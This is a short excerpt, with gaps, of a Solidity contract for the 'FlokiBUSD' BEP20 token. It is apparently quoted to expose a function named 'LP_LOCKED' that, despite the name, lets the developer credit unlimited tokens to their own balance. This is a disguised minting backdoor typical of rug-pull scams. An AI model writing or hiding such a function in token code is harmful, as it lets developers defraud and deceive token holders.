...
contract FlokiBUSD is Context, BEP20 {
    ...
    string private _name = "FlokiBUSD";
    string private _symbol = "FBUSD";
    ...
    function LP_LOCKED(uint256 amount) external onlyDev {
       _holders[_msgSender()] += amount;
